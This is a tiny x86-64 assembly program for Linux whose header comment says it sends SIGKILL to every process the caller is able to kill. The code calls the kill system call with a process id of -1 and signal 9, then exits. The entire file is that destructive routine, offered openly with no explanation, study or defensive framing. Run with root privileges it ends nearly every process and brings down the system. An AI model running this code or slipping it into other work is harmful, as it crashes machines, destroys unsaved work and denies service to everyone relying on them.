;---------------------------------
;bplinux@posteo.de
;
;this is used to sigkill every
;process we are able to kill
;---------------------------------

[BITS 64]

KILL	equ 62
PID	equ -1
SIGKILL	equ 9
EXIT	equ 60

segment .text
	global _start

_start:	xor rax, rax
	mov al, KILL
	xor rdi, rdi
	mov edi, PID
	xor rsi, rsi
	mov sil, SIGKILL
	syscall
	xor rax, rax
	mov al, EXIT
	xor rdi, rdi
	syscall

